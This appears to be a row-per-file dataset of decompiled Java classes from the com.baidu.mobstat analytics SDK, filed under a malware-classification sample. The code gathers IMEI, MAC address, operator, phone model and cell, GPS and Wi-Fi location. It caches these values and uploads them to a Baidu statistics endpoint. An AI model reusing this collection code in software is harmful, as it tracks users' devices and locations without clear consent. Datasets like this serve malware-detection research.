"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\b.code","public class b {   static String a=""Android"";   String b;   String f;   String g;   int h;   int i;   String k;   String l;   String m;   String n;   String o;   String p;   String c=null;   String d=null;   int e=-1;   String j=null;   public synchronized void a(  Context context){     if (this.e == -1) {       com.baidu.mobstat.a.b.d(context,""android.permission.READ_PHONE_STATE"");       com.baidu.mobstat.a.b.d(context,""android.permission.INTERNET"");       com.baidu.mobstat.a.b.d(context,""android.permission.ACCESS_NETWORK_STATE"");       com.baidu.mobstat.a.b.d(context,""android.permission.WRITE_SETTINGS"");       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       this.b=CooperService.getOSVersion();       this.l=CooperService.getPhoneModel();       this.g=CooperService.getDeviceId(telephonyManager,context);       this.d=CooperService.getCIUD(context);       try {         this.k=CooperService.getOperator(telephonyManager);       }  catch (      Exception e) {         com.baidu.mobstat.a.c.a(e);       }       try {         this.h=x.a(context);         this.i=x.b(context);         if (context.getResources().getConfiguration().orientation == 2) {           com.baidu.mobstat.a.c.a(""stat"",""Configuration.ORIENTATION_LANDSCAPE"");           this.h^=this.i;           this.i=this.h ^ this.i;           this.h^=this.i;         }       }  catch (      Exception e2) {         com.baidu.mobstat.a.c.a(e2);       }       this.j=CooperService.getAppChannel(context);       this.c=CooperService.getAppKey(context);       try {         this.e=CooperService.getAppVersionCode(context);         this.f=CooperService.getAppVersionName(context);       }  catch (      Exception e3) {         com.baidu.mobstat.a.c.a(e3);       }       try {         if (CooperService.checkCellLocationSetting(context)) {           this.m=x.e(context);         }  else {           this.m=""0_0_0"";         }       }  catch (      Exception e4) {         com.baidu.mobstat.a.c.a(e4);       }       try {         if (CooperService.checkGPSLocationSetting(context)) {           this.n=x.f(context);         }  else {           this.n="""";         }       }  catch (      Exception e5) {         com.baidu.mobstat.a.c.a(e5);       }       try {         if (CooperService.checkWifiLocationSetting(context)) {           this.o=x.h(context);         }  else {           this.o="""";         }       }  catch (      Exception e6) {         com.baidu.mobstat.a.c.a(e6);       }       try {         this.p=CooperService.getLinkedWay(context);       }  catch (      Exception e7) {         com.baidu.mobstat.a.c.a(e7);       }     }   }   public synchronized void b(  Context context){     if (DataCore.a().length() <= 0) {       a(context);       try {         DataCore.a().put(""o"",a == null ? """" : a);         DataCore.a().put(""s"",this.b == null ? """" : this.b);         DataCore.a().put(""k"",this.c == null ? """" : this.c);         DataCore.a().put(""i"",this.d == null ? """" : this.d);         DataCore.a().put(""v"",""3.4"");         DataCore.a().put(""a"",this.e);         DataCore.a().put(""n"",this.f == null ? """" : this.f);         DataCore.a().put(""d"",this.g == null ? """" : this.g);         DataCore.a().put(""w"",this.h);         DataCore.a().put(""h"",this.i);         DataCore.a().put(""c"",this.j == null ? """" : this.j);         DataCore.a().put(""op"",this.k == null ? """" : this.k);         DataCore.a().put(""m"",this.l == null ? """" : this.l);         DataCore.a().put(""cl"",this.m);         DataCore.a().put(""gl"",this.n == null ? """" : this.n);         DataCore.a().put(""wl"",this.o == null ? """" : this.o);         DataCore.a().put(""l"",this.p == null ? """" : this.p);         DataCore.a().put(""t"",System.currentTimeMillis());         DataCore.a().put(""sq"",0);         com.baidu.mobstat.a.c.a(""stat"",DataCore.a().toString());       }  catch (      JSONException e) {         com.baidu.mobstat.a.c.a(""stat"",""header ini error"");         throw new RuntimeException(""header ini error"");       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\BasicStoreTools.code","public class BasicStoreTools extends BasicStoreToolsBase {   public static final String APP_ANALYSIS_EXCEPTION=""exceptionanalysisflag"";   public static final String APP_ANALYSIS_EXCEPTION_TAG=""exceptionanalysistag"";   public static final String APP_SET_APPKEY=""mjsetappkey"";   public static final String APP_SET_CHANNEL=""setchannelwithcodevalue"";   public static final String APP_SET_CHANNEL_WITH_CODE=""setchannelwithcode"";   public static final String DEVICE_CUID=""cuid"";   public static final String DEVICE_ID=""device_id"";   public static final String LAST_SEND_TIME=""lastsendtime"";   public static final String ONLY_WIFI=""onlywifi"";   public static final String SEND_LOG_TYPE=""sendLogtype"";   public static final String TIME_INTERVAL=""timeinterval"";   static BasicStoreTools a=new BasicStoreTools();   private BasicStoreTools(){   }   public static BasicStoreTools getInstance(){     return a;   }   public boolean loadAppChannelWithCode(  Context context){     return getBoolean(context,APP_SET_CHANNEL_WITH_CODE,false);   }   public String loadAppChannelWithPreference(  Context context){     return getString(context,APP_SET_CHANNEL,null);   }   protected String loadAppKey(  Context context){     return getString(context,APP_SET_APPKEY,null);   }   protected String loadExceptionHeadTag(  Context context){     return getString(context,APP_ANALYSIS_EXCEPTION_TAG,null);   }   public boolean loadExceptionTurn(  Context context){     return getBoolean(context,APP_ANALYSIS_EXCEPTION,false);   }   public String loadGenerateDeviceCUID(  Context context){     return getString(context,DEVICE_CUID,null);   }   public String loadGenerateDeviceId(  Context context){     return getString(context,DEVICE_ID,null);   }   protected long loadLastSendTime(  Context context){     return getLong(context,LAST_SEND_TIME,0L);   }   public boolean loadOnlyWifiChannel(  Context context){     return getBoolean(context,ONLY_WIFI,false);   }   public int loadSendStrategy(  Context context){     return getInt(context,SEND_LOG_TYPE,0);   }   public int loadSendStrategyTime(  Context context){     return getInt(context,TIME_INTERVAL,1);   }   public void setAppChannelWithCode(  Context context,  boolean z){     putBoolean(context,APP_SET_CHANNEL_WITH_CODE,z);   }   public void setAppChannelWithPreference(  Context context,  String str){     putString(context,APP_SET_CHANNEL,str);   }   protected void setAppKey(  Context context,  String str){     putString(context,APP_SET_APPKEY,str);   }   protected void setExceptionHeadTag(  Context context,  String str){     putString(context,APP_ANALYSIS_EXCEPTION_TAG,str);   }   public void setExceptionTurn(  Context context,  boolean z){     putBoolean(context,APP_ANALYSIS_EXCEPTION,z);   }   public void setGenerateDeviceCUID(  Context context,  String str){     putString(context,DEVICE_CUID,str);   }   public void setGenerateDeviceId(  Context context,  String str){     putString(context,DEVICE_ID,str);   }   public void setLastSendTime(  Context context,  long j){     putLong(context,LAST_SEND_TIME,j);   }   public void setOnlyWifi(  Context context,  boolean z){     putBoolean(context,ONLY_WIFI,z);   }   public void setSendStrategy(  Context context,  int i){     putInt(context,SEND_LOG_TYPE,i);   }   public void setSendStrategyTime(  Context context,  int i){     putInt(context,TIME_INTERVAL,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\BasicStoreToolsBase.code","public class BasicStoreToolsBase {   private final String a=""__Baidu_Stat_SDK_SendRem"";   private SharedPreferences b;   private SharedPreferences c;   private SharedPreferences a(  Context context){     if (this.b == null) {       this.b=context.getSharedPreferences(""__Baidu_Stat_SDK_SendRem"",0);     }     return this.b;   }   private SharedPreferences b(  Context context){     if (this.c == null) {       this.c=PreferenceManager.getDefaultSharedPreferences(context);     }     return this.c;   }   public boolean getBoolean(  Context context,  String str,  boolean z){     return a(context).getBoolean(str,z);   }   public Float getFloatt(  Context context,  String str,  int i){     return Float.valueOf(a(context).getFloat(str,i));   }   public int getInt(  Context context,  String str,  int i){     return a(context).getInt(str,i);   }   public long getLong(  Context context,  String str,  long j){     return a(context).getLong(str,j);   }   public boolean getSharedBoolean(  Context context,  String str,  boolean z){     return b(context).getBoolean(str,z);   }   public int getSharedInt(  Context context,  String str,  int i){     return b(context).getInt(str,i);   }   public long getSharedLong(  Context context,  String str,  long j){     return b(context).getLong(str,j);   }   public String getSharedString(  Context context,  String str,  String str2){     return b(context).getString(str,str2);   }   public String getString(  Context context,  String str,  String str2){     return a(context).getString(str,str2);   }   public void putBoolean(  Context context,  String str,  boolean z){     a(context).edit().putBoolean(str,z).commit();   }   public void putFloat(  Context context,  String str,  Float f){     a(context).edit().putFloat(str,f.floatValue()).commit();   }   public void putInt(  Context context,  String str,  int i){     a(context).edit().putInt(str,i).commit();   }   public void putLong(  Context context,  String str,  long j){     a(context).edit().putLong(str,j).commit();   }   public void putSharedBoolean(  Context context,  String str,  boolean z){     b(context).edit().putBoolean(str,z).commit();   }   public void putSharedInt(  Context context,  String str,  int i){     b(context).edit().putInt(str,i).commit();   }   public void putSharedLong(  Context context,  String str,  long j){     b(context).edit().putLong(str,j).commit();   }   public void putSharedString(  Context context,  String str,  String str2){     b(context).edit().putString(str,str2).commit();   }   public void putString(  Context context,  String str,  String str2){     a(context).edit().putString(str,str2).commit();   }   public void removeShare(  Context context,  String str){     b(context).edit().remove(str).commit();   }   public void removeString(  Context context,  String str){     a(context).edit().remove(str);   }   public boolean updateShareBoolean(  Intent intent,  Activity activity,  String str){     return updateShareBoolean(intent,activity,str,true);   }   public boolean updateShareBoolean(  Intent intent,  Activity activity,  String str,  boolean z){     boolean booleanExtra;     if (intent == null || (booleanExtra=intent.getBooleanExtra(str,z)) == getSharedBoolean(activity,str,z)) {       return false;     }     putSharedBoolean(activity,str,booleanExtra);     return true;   }   public boolean updateShareInt(  Intent intent,  Activity activity,  String str,  int i){     int intExtra;     if (intent == null || (intExtra=intent.getIntExtra(str,i)) == getSharedInt(activity,str,i)) {       return false;     }     putSharedInt(activity,str,intExtra);     return true;   }   public boolean updateShareString(  Intent intent,  Activity activity,  String str){     if (intent != null) {       String stringExtra=intent.getStringExtra(str);       if (stringExtra != null) {         stringExtra=stringExtra.trim();         if (stringExtra.length() == 0) {           stringExtra=null;         }       }       if (!TextUtils.equals(stringExtra,getSharedString(activity,str,null))) {         putSharedString(activity,str,stringExtra);         return true;       }     }     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\c.code","public class c {   private static Handler d;   HashMap<String,h> a=new HashMap<>();   public final String b=""$|$"";   private static HandlerThread c=new HandlerThread(""EventHandleThread"");   private static c e=new c();   private c(){     c.start();     c.setPriority(10);     d=new Handler(c.getLooper());   }   public static c a(){     return e;   }   public String a(  String str,  String str2){     return ""__sdk_"" + str + ""$|$""+ str2;   }   public void a(  Context context,  String str,  String str2,  int i,  long j){     d.post(new d(this,str,str2,i,j,context));   }   public void a(  Context context,  String str,  String str2,  long j){     d.post(new e(this,j,str,str2));   }   public void b(  Context context,  String str,  String str2,  long j){     d.post(new f(this,str,str2,j,context));   }   public void c(  Context context,  String str,  String str2,  long j){     d.post(new g(this,j,str,str2,context));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\CooperService.code","public class CooperService extends BasicStoreToolsBase {   private static b a=new b();   private static JSONObject b=new JSONObject();   private static String c=""activehead"";   private static HashMap<String,Object> d=new HashMap<>();   public static b a(){     return a;   }   private static String a(  String str,  Context context){     if (str == null) {       return null;     }     if (!str.equals(""000000000000000"")) {       return str;     }     String macAddress=getMacAddress(context);     com.baidu.mobstat.a.c.a(""stat"",""imei=null,mac="" + macAddress);     return macAddress;   }   public static boolean checkCellLocationSetting(  Context context){     String a2=x.a(context,""BaiduMobAd_CELL_LOCATION"");     return a2 == null || !a2.toLowerCase().equals(""false"");   }   public static boolean checkGPSLocationSetting(  Context context){     String a2=x.a(context,""BaiduMobAd_GPS_LOCATION"");     return a2 == null || !a2.toLowerCase().equals(""false"");   }   public static boolean checkWifiLocationSetting(  Context context){     String a2=x.a(context,""BaiduMobAd_WIFI_LOCATION"");     return a2 == null || !a2.toLowerCase().equals(""false"");   }   public static String getAppChannel(  Context context){     try {       if (a.j == null || a.j.equals("""")) {         boolean loadAppChannelWithCode=BasicStoreTools.getInstance().loadAppChannelWithCode(context);         if (loadAppChannelWithCode) {           a.j=BasicStoreTools.getInstance().loadAppChannelWithPreference(context);         }         if (!loadAppChannelWithCode || a.j == null || a.j.equals("""")) {           a.j=x.a(context,""BaiduMobAd_CHANNEL"");         }       }     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(e);     }     return a.j;   }   public static String getAppKey(  Context context){     if (a.c == null) {       a.c=x.a(context,""BaiduMobAd_STAT_ID"");     }     return a.c;   }   public static int getAppVersionCode(  Context context){     if (a.e == -1) {       a.e=x.c(context);     }     return a.e;   }   public static String getAppVersionName(  Context context){     if (a.f == null || """".equals(a.f)) {       a.f=x.d(context);     }     return a.f;   }   public static String getCIUD(  Context context){     if (a.d == null) {       a.d=BasicStoreTools.getInstance().loadGenerateDeviceCUID(context);       if (a.d == null || """".equalsIgnoreCase(a.d)) {         try {           a.d=com.baidu.a.a.a.b.a.a(context);           BasicStoreTools.getInstance().setGenerateDeviceCUID(context,a.d);         }  catch (        Exception e) {           com.baidu.mobstat.a.c.c(""sdkstat"",e.getMessage());         }       }       try {         a.d=Pattern.compile(""\\s*|\t|\r|\n"").matcher(a.d).replaceAll("""");       }  catch (      Exception e2) {         a.d=com.baidu.a.a.a.b.a.a(context);       }     }     return a.d;   }   public static String getDeviceId(  TelephonyManager telephonyManager,  Context context){     String str;     if (telephonyManager == null) {       return a.g;     }     String str2=a.g;     if (str2 == null || str2.equals("""")) {       try {         str2=Pattern.compile(""\\s*|\t|\r|\n"").matcher(telephonyManager.getDeviceId()).replaceAll("""");         str=a(str2,context);       }  catch (      Exception e) {         com.baidu.mobstat.a.c.a(e);         str=str2;       }       if (str == null) {         str=getMacAddress(context);       }       if (str == null || str.equals(""000000000000000"")) {         str=BasicStoreTools.getInstance().loadGenerateDeviceId(context);       }       if (str == null || str.equals(""000000000000000"")) {         str=""hol"" + (new Date().getTime() + """").hashCode() + ""mes"";         BasicStoreTools.getInstance().setGenerateDeviceId(context,str);         com.baidu.mobstat.a.c.a(""stat"",""è®¾å¤‡idä¸ºç©ºï¼Œç³»ç»Ÿç”Ÿæˆ�id ="" + str);       }       a.g=str;     }     return a.g;   }   public static String getLinkedWay(  Context context){     if (a.p == null || """".equals(a.p)) {       a.p=x.i(context);     }     return a.p;   }   public static String getMTJSDKVersion(){     return ""3.4"";   }   public static String getMacAddress(  Context context){     String g=x.g(context);     if (g != null) {       return g.replaceAll("":"","""");     }     return null;   }   public static String getOSVersion(){     if (a.b == null || """".equals(a.b)) {       a.b=Build.VERSION.SDK;     }     return a.b;   }   public static String getOperator(  TelephonyManager telephonyManager){     if (a.k == null || """".equals(a.k)) {       a.k=telephonyManager.getNetworkOperator();     }     return a.k;   }   public static String getPhoneModel(){     if (a.l == null || """".equals(a.l)) {       a.l=Build.MODEL;     }     return a.l;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\d.code","class d implements Runnable {   final String a;   final String b;   final int c;   final long d;   final Context e;   final c f;   public d(  c cVar,  String str,  String str2,  int i,  long j,  Context context){     this.f=cVar;     this.a=str;     this.b=str2;     this.c=i;     this.d=j;     this.e=context;   }   @Override public void run(){     if (!j.a().c()) { synchronized (j.a()) {         try {           j.a().wait();         }  catch (        InterruptedException e) {           com.baidu.mobstat.a.c.a(""stat"",e);         }       }     }     DataCore.getInstance().putEvent(this.a,this.b,this.c,this.d,0L);     DataCore.getInstance().flush(this.e);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\DataCore.code","public class DataCore {   private static JSONObject b=new JSONObject();   private static DataCore h=new DataCore();   private int a=0;   private JSONArray c=new JSONArray();   private JSONArray d=new JSONArray();   private JSONArray e=new JSONArray();   private JSONArray f=new JSONArray();   private boolean g=false;   private DataCore(){   }   public static JSONObject a(){     return b;   }   private void a(  boolean z){     this.g=z;   }   private boolean b(){     return this.g;   }   public static DataCore getInstance(){     return h;   }   public void flush(  Context context){     com.baidu.mobstat.a.c.a(""stat"",""flush cache to __local_stat_cache.json"");     JSONObject jSONObject=new JSONObject();     try { synchronized (this.c) {         jSONObject.put(""pr"",new JSONArray(this.c.toString()));       } synchronized (this.d) {         jSONObject.put(""ev"",new JSONArray(this.d.toString()));       } synchronized (this.f) {         jSONObject.put(""ex"",new JSONArray(this.f.toString()));       }     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",""flushLogWithoutHeader() construct cache error"");     }     String jSONObject2=jSONObject.toString();     if (b()) {       com.baidu.mobstat.a.c.a(""stat"",""cache.json exceed 204800B,stop flush."");       return;     }     int length=jSONObject2.getBytes().length;     if (length >= 204800) {       a(true);       return;     }     this.a=length;     com.baidu.mobstat.a.c.a(""stat"",""flush:cacheFileSize is:"" + this.a);     com.baidu.mobstat.a.b.a(false,context,""__local_stat_cache.json"",jSONObject2,false);   }   public void getMemInfo(  Context context){   }   public synchronized void installHeader(  Context context){     CooperService.a().b(context);   }   public boolean isPartEmpty(){     return this.c.length() == 0 && this.d.length() == 0 && this.f.length() == 0;   }   public void loadLastSession(  Context context){     com.baidu.mobstat.a.c.a(""stat"",""LoadLastSession()"");     if (context != null && com.baidu.mobstat.a.b.c(context,""__local_last_session.json"")) {       String a=com.baidu.mobstat.a.b.a(false,context,""__local_last_session.json"");       if (a.equals("""")) {         com.baidu.mobstat.a.c.a(""stat"",""loadLastSession(): last_session.json file not found."");         return;       }       com.baidu.mobstat.a.b.a(false,context,""__local_last_session.json"",new JSONObject().toString(),false);       putSession(a);       flush(context);     }   }   public void loadStatData(  Context context){     if (context != null && com.baidu.mobstat.a.b.c(context,""__local_stat_cache.json"")) {       String a=com.baidu.mobstat.a.b.a(false,context,""__local_stat_cache.json"");       if (a.equals("""")) {         com.baidu.mobstat.a.c.a(""stat"",""stat_cache file not found."");         return;       }       com.baidu.mobstat.a.c.a(""stat"",""loadStatData, "");       try {         this.a=a.getBytes().length;         com.baidu.mobstat.a.c.a(""stat"",""load Stat Data:cacheFileSize is:"" + this.a);         JSONObject jSONObject=new JSONObject(a);         com.baidu.mobstat.a.c.a(""stat"",""Load cache:"" + a);         long currentTimeMillis=System.currentTimeMillis();         JSONArray jSONArray=jSONObject.getJSONArray(""pr"");         for (int i=0; i < jSONArray.length(); i++) {           JSONObject jSONObject2=jSONArray.getJSONObject(i);           if (currentTimeMillis - jSONObject2.getLong(""s"") <= 604800000) {             putSession(jSONObject2,true);           }         }         JSONArray jSONArray2=jSONObject.getJSONArray(""ev"");         for (int i2=0; i2 < jSONArray2.length(); i2++) {           JSONObject jSONObject3=jSONArray2.getJSONObject(i2);           if (currentTimeMillis - jSONObject3.getLong(""t"") <= 604800000) {             putEvent(jSONObject3,true);           }         }         JSONArray jSONArray3=jSONObject.getJSONArray(""ex"");         for (int i3=0; i3 < jSONArray3.length(); i3++) {           JSONObject jSONObject4=jSONArray3.getJSONObject(i3);           if (currentTimeMillis - jSONObject4.getLong(""t"") <= 604800000) {             putException(jSONObject4,true);           }         }       }  catch (      JSONException e) {         com.baidu.mobstat.a.c.a(""stat"",""Load stat data error:"" + e);       }     }   }   public void putEvent(  String str,  String str2,  int i,  long j,  long j2){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""i"",str);       jSONObject.put(""l"",str2);       jSONObject.put(""c"",i);       jSONObject.put(""t"",j);       jSONObject.put(""d"",j2);       putEvent(jSONObject,false);       com.baidu.mobstat.a.c.a(""stat"",""put event:"" + jSONObject.toString());     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",e);     }   }   public void putEvent(  org.json.JSONObject r18,  boolean r19){     throw new UnsupportedOperationException(""Method not decompiled: com.baidu.mobstat.DataCore.putEvent(org.json.JSONObject, boolean):void"");   }   public void putException(  long j,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""t"",j);       jSONObject.put(""y"",str2);       if (str.getBytes().length > 5120) {         byte[] bArr=new byte[5120];         str.getBytes(0,5120,bArr,0);         com.baidu.mobstat.a.c.a(""exception bytes="" + bArr.length);         jSONObject.put(""c"",new String(bArr));       }  else {         jSONObject.put(""c"",str);       }     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",e);     }     putException(jSONObject,false);   }   public void putException(  JSONObject jSONObject,  boolean z){     if (jSONObject != null && !z) {       int length=jSONObject.toString().getBytes().length;       com.baidu.mobstat.a.c.a(""stat"",""putException:addSize is:"",Integer.valueOf(length));       if (length + this.a > 204800) {         com.baidu.mobstat.a.c.a(""stat"",""putException: size is full!"");         return;       }     } synchronized (this.f) {       try {         this.f.put(this.f.length(),jSONObject);       }  catch (      JSONException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   }   public void putSession(  String str){     if (str.equals(""{}"") || str.equals("""")) {       return;     }     try {       JSONObject jSONObject=new JSONObject(str);       putSession(jSONObject,false);       com.baidu.mobstat.a.c.a(""stat"",""Load last session:"" + jSONObject);     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",""putSession()"" + e);     }   }   public void putSession(  JSONObject jSONObject,  boolean z){     if (jSONObject != null && !z) {       int length=jSONObject.toString().getBytes().length;       com.baidu.mobstat.a.c.a(""stat"",""putSession:addSize is:"",Integer.valueOf(length));       if (length + this.a > 204800) {         com.baidu.mobstat.a.c.a(""stat"",""putSession: size is full!"");         return;       }     } synchronized (this.c) {       try {         this.c.put(this.c.length(),jSONObject);       }  catch (      JSONException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   }   public boolean sendLogData(  Context context){     boolean z=false;     com.baidu.mobstat.a.c.a(""stat"",""sendLogData() begin."");     if (CooperService.a() != null && (CooperService.a().c == null || """".equalsIgnoreCase(CooperService.a().c))) {       CooperService.a().a(context);       if (CooperService.a().c == null || """".equalsIgnoreCase(CooperService.a().c)) {         com.baidu.mobstat.a.c.c(""ä¸�èƒ½åœ¨manifest.xmlä¸­æ‰¾åˆ°APP Key||can't find app key in manifest.xml."");         return z;       }     }     JSONObject jSONObject=new JSONObject(); synchronized (b) {       try {         b.put(""t"",System.currentTimeMillis());         b.put(""ss"",q.b().d());         jSONObject.put(""he"",b); synchronized (this.c) {           try {             jSONObject.put(""pr"",this.c); synchronized (this.d) {               try {                 jSONObject.put(""ev"",this.d); synchronized (this.e) { synchronized (this.f) {                     try {                       jSONObject.put(""ex"",this.f);                       String jSONObject2=jSONObject.toString();                       com.baidu.mobstat.a.c.a(""stat"",""---Send Data Is:"" + jSONObject2);                       try {                         x.a(context,""http://hmma.baidu.com/app.gif"",jSONObject2,50000,50000);                         com.baidu.mobstat.a.c.a(""stat"",""sendLogData() send_sucess.data="" + jSONObject2);                         z=true;                       }  catch (                      Exception e) {                         com.baidu.mobstat.a.c.c(""stat"",""send error++++++"" + e);                       }                       com.baidu.mobstat.a.c.a(""stat"",""send log data over. result="" + z + ""data=""+ jSONObject2);                       if (z) {                         a(false);                         this.f=new JSONArray();                         this.d=new JSONArray();                         this.c=new JSONArray();                         flush(context);                         q.b().c();                         k.a().c(context);                       }                     }  catch (                    JSONException e2) {                       com.baidu.mobstat.a.c.a(""stat"",e2);                     }                   }                 }               }  catch (              JSONException e3) {                 com.baidu.mobstat.a.c.a(""stat"",e3);               }             }           }  catch (          JSONException e4) {             com.baidu.mobstat.a.c.a(""stat"",e4.toString());           }         }       }  catch (      JSONException e5) {         com.baidu.mobstat.a.c.a(""stat"",e5);       }     }     com.baidu.mobstat.a.c.a(""stat"",""sendLogData() end."");     return z;   }   public void setAppChannel(  Context context,  String str,  boolean z){     if (str == null || str.equals("""")) {       com.baidu.mobstat.a.c.c(""sdkstat"",""è®¾ç½®çš„æ¸ é�“ä¸�èƒ½ä¸ºç©ºæˆ–è€…ä¸ºnull || The channel that you have been set is null or empty, please check it."");     }     CooperService.a().j=str;     if (z && str != null && !str.equals("""")) {       BasicStoreTools.getInstance().setAppChannelWithPreference(context,str);       BasicStoreTools.getInstance().setAppChannelWithCode(context,true);     }     if (z) {       return;     }     BasicStoreTools.getInstance().setAppChannelWithPreference(context,"""");     BasicStoreTools.getInstance().setAppChannelWithCode(context,false);   }   public void setAppChannel(  String str){     if (str == null || str.equals("""")) {       com.baidu.mobstat.a.c.c(""sdkstat"",""è®¾ç½®çš„æ¸ é�“ä¸�èƒ½ä¸ºç©ºæˆ–è€…ä¸ºnull || The channel that you have been set is null or empty, please check it."");     }     CooperService.a().j=str;   }   public void setAppKey(  String str){     CooperService.a().c=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\e.code","class e implements Runnable {   final long a;   final String b;   final String c;   final c d;   public e(  c cVar,  long j,  String str,  String str2){     this.d=cVar;     this.a=j;     this.b=str;     this.c=str2;   }   @Override public void run(){     if (!j.a().c()) { synchronized (j.a()) {         try {           j.a().wait();         }  catch (        InterruptedException e) {           com.baidu.mobstat.a.c.a(""stat"",e);         }       }     }     h hVar=new h(this.d);     hVar.c=this.a;     hVar.a=this.b;     hVar.b=this.c;     String a=this.d.a(this.b,this.c);     if (this.d.a.get(a) != null) {       com.baidu.mobstat.a.c.b(""stat"",""EventStat: event_id["" + this.b + ""] with label[""+ this.c+ ""] is duplicated, older is removed"");     }     this.d.a.put(a,hVar);     com.baidu.mobstat.a.c.a(""stat"",""put a keyword["" + a + ""] into durationlist"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\f.code","class f implements Runnable {   final String a;   final String b;   final long c;   final Context d;   final c e;   public f(  c cVar,  String str,  String str2,  long j,  Context context){     this.e=cVar;     this.a=str;     this.b=str2;     this.c=j;     this.d=context;   }   @Override public void run(){     if (!j.a().c()) { synchronized (j.a()) {         try {           j.a().wait();         }  catch (        InterruptedException e) {           com.baidu.mobstat.a.c.a(""stat"",e);         }       }     }     String a=this.e.a(this.a,this.b);     h hVar=this.e.a.get(a);     if (hVar == null) {       com.baidu.mobstat.a.c.b(""stat"",""EventStat: event_id["" + this.a + ""] with label[""+ this.b+ ""] is not started or alread done."");       return;     }     if (!this.a.equals(hVar.a) || !this.b.equals(hVar.b)) {       com.baidu.mobstat.a.c.a(""stat"",""EventStat: Wrong Case, eventId/label pair not match"");       return;     }     this.e.a.remove(a);     long j=this.c - hVar.c;     if (j <= 0) {       com.baidu.mobstat.a.c.a(""stat"",""EventStat: Wrong Case, Duration must be positive"");     }  else {       DataCore.getInstance().putEvent(this.a,this.b,1,hVar.c,j);       DataCore.getInstance().flush(this.d);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\g.code","class g implements Runnable {   final long a;   final String b;   final String c;   final Context d;   final c e;   public g(  c cVar,  long j,  String str,  String str2,  Context context){     this.e=cVar;     this.a=j;     this.b=str;     this.c=str2;     this.d=context;   }   @Override public void run(){     if (!j.a().c()) { synchronized (j.a()) {         try {           j.a().wait();         }  catch (        InterruptedException e) {           com.baidu.mobstat.a.c.a(""stat"",e);         }       }     }     if (this.a <= 0) {       com.baidu.mobstat.a.c.a(""stat"",""EventStat: Wrong Case, Duration must be positive"");     }  else {       DataCore.getInstance().putEvent(this.b,this.c,1,System.currentTimeMillis(),this.a);       DataCore.getInstance().flush(this.d);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\h.code","class h {   String a;   String b;   long c;   final c d;   public h(  c cVar){     this.d=cVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\i.code","public class i {   private static i a=new i();   private boolean b=false;   private i(){   }   public static i a(){     return a;   }   public void a(  Context context){     com.baidu.mobstat.a.c.a(""stat"",""openExceptonAnalysis"");     if (this.b) {       return;     }     this.b=true;     a.a().a(context);   }   public void b(  Context context){     if (context == null) {       com.baidu.mobstat.a.c.a(""stat"",""exceptonAnalysis, context=null"");       return;     }     JSONArray b=a.a().b(context);     if (b == null) {       com.baidu.mobstat.a.c.a(""stat"",""no exception str"");       return;     }     com.baidu.mobstat.a.c.a(""stat"",""move exception cache to stat cache"");     int i=0;     while (true) {       try {         int i2=i;         if (i2 >= b.length()) {           return;         }         JSONObject jSONObject=(JSONObject)b.get(i2);         DataCore.getInstance().putException(jSONObject.getLong(""t""),jSONObject.getString(""c""),jSONObject.getString(""y""));         DataCore.getInstance().flush(context);         i=i2 + 1;       }  catch (      Exception e) {         com.baidu.mobstat.a.c.a(""stat"",e);         return;       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\j.code","class j extends Thread {   private static j a=new j();   private Context b;   private boolean c=false;   private boolean d=false;   private j(){   }   public static j a(){     return a;   }   private void d(){     this.c=true;   }   private synchronized void e(){     this.d=true;   }   public void a(  Context context){     if (context == null || b()) {       return;     }     this.b=context;     d();     start();     com.baidu.mobstat.a.c.a(""**************load caceh**start********"");   }   public boolean b(){     return this.c;   }   public synchronized boolean c(){     return this.d;   }   @Override public void run(){     Process.setThreadPriority(19);     while (!this.d) {       k.a().a(this.b);       DataCore.getInstance().loadStatData(this.b);       DataCore.getInstance().loadLastSession(this.b);       e(); synchronized (a) {         try {           notifyAll();         }  catch (        IllegalMonitorStateException e) {           com.baidu.mobstat.a.c.a(""stat"",e);         }       }       DataCore.getInstance().installHeader(this.b);       k.a().b(this.b);       com.baidu.mobstat.a.c.a(""**************load caceh**end********"");     }   } } "
